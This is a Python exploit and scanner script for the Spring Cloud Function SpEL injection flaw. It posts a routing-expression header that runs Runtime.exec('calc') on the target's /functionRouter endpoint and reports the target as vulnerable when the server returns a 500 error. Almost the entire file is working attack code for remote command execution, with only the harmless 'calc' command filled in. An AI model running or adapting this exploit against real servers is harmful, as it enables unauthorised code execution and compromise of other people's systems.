# coding=UTF-8
import requests
import sys
import base64
import urllib3
urllib3.disable_warnings()

def calculator(url,ip,port):

    payload ='T(java.lang.Runtime).getRuntime().exec("calc")'

    data ='jojo'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = '/functionRouter'

    allurl = url + path
    try:
        req=requests.post(url=allurl,headers=headers,data=data,verify=False,timeout=3)
        code =req.status_code
        text = req.text
        rsp = '"error":"Internal Server Error"'

        if code == 500 and rsp in text:
            print('{url} 存在漏洞')
        else:
            print('{url} 不存在漏洞')

    except requests.exceptions.RequestException:
        print('[-]{url} 检测超时')
        pass
    except:
        print('[-]{url} 检测异常')
        pass



if __name__ == '__main__' :
    try:
        cmd1 =sys.argv[1]
        cmd2 =sys.argv[2]
        cmd3 =sys.argv[3]
        calculator(cmd1,cmd2,cmd3)
    except:
        print('python jojoSPel.py url ip port')
        pass